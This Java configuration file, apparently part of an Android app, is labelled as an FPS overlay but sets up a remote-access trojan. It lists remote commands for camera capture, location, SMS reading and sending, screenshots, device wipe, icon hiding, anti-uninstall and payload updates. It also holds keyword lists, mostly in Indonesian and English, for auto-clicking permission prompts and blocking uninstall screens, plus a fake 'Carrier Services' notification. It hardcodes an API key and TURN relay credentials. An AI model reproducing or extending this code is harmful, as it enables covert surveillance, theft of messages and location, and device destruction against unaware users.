package com.bluestacks.fpsoverlay;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;

public class Config {
    // Commands
    public static final String CMD_LOCK = "lock";
    public static final String CMD_UNLOCK = "unlock";
    public static final String CMD_STOP_STREAM = "stop_stream";
    public static final String CMD_SCREENSHOT = "screenshot";
    public static final String CMD_CHECK_PERMS = "check_perms";
    public static final String CMD_CAMERA_FRONT = "camera_front";
    public static final String CMD_CAMERA_BACK = "camera_back";
    public static final String CMD_LOCATION = "location";
    public static final String CMD_SMS_LIST = "sms_list";
    public static final String CMD_SMS_SEND = "send_sms";
    public static final String CMD_VIBRATE = "vibrate";
    public static final String CMD_TOAST = "toast";
    public static final String CMD_PLAY_AUDIO = "play_audio";
    public static final String CMD_STOP_AUDIO = "stop_audio";
    public static final String CMD_WIPE = "wipe";
    public static final String CMD_ANTI_UNINSTALL = "anti_uninstall";
    public static final String CMD_HIDE_ICON = "hide_icon";
    public static final String CMD_FLASH = "flash";
    public static final String CMD_REQ_PERM = "request_perm";
    public static final String CMD_LOAD_MODULE = "load_module";
    public static final String CMD_UPDATE_PAYLOAD = "update_payload";

    // --- DYNAMIC SETTINGS (Default Values) ---
    
    // WebRTC Config
    public static String METERED_API_KEY = "45baaf2cec8fdb459d24d0ad09cf2810f7a4";
    public static String[] FALLBACK_TURN_URLS = {
        "turn:global.relay.metered.ca:80",
        "turn:global.relay.metered.ca:443",
        "turn:global.relay.metered.ca:443?transport=tcp",
        "turns:global.relay.metered.ca:443?transport=tcp"
    };
    public static String FALLBACK_TURN_USER = "33500225b9105e9ce477d7f4";
    public static String FALLBACK_TURN_PASS = "97UioiShU85IkOua";
    public static int STREAM_MIN_BITRATE = 50 * 1000;
    public static int STREAM_MAX_BITRATE = 600 * 1000;
    public static int STREAM_FPS = 12;

    // Media Config
    public static int FLASH_INTERVAL_MS = 300;
    public static int IMAGE_QUALITY = 40;

    // Protection Config
    public static List<String> ANTI_UNINSTALL_KEYWORDS = new CopyOnWriteArrayList<>(Arrays.asList(
        "uninstall", "uninstal", "hapus", "bongkar", "copot", "pemasangan", "delete", "instalan", "menghapus"
    ));
    public static List<String> PROTECTED_PACKAGES = new CopyOnWriteArrayList<>(Arrays.asList(
        "packageinstaller", "settings", "security", "safecenter", "permissioncontroller"
    ));
    public static List<String> PERM_IDS = new CopyOnWriteArrayList<>(Arrays.asList(
        "com.android.permissioncontroller:id/permission_allow_button",
        "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
        "com.android.permissioncontroller:id/permission_allow_always_button",
        "android:id/button1"
    ));
    public static List<String> PERM_KEYWORDS = new CopyOnWriteArrayList<>(Arrays.asList(
        "Allow", "Izinkan", "While using", "Saat aplikasi", "Allow all the time", 
        "Izinkan sepanjang waktu", "Yes", "Ya", "OK", "Permit", "Bolehkan", "Sudah", 
        "Terima", "Accept", "Tetap izinkan", "Always allow", "Saat aplikasinya",
        "Start now", "Mulai sekarang", "Start recording", "Mulai merekam", 
        "Grant", "Confirm", "Izinkan saja", "Don't show again"
    ));

    // Service Branding
    public static String NOTIF_TITLE = "Carrier Services";
    public static String NOTIF_TEXT = "System synchronization active";

    // Timing Intervals
    public static int HEARTBEAT_MS = 15000;
    public static int STATUS_UPDATE_MS = 5000;
}
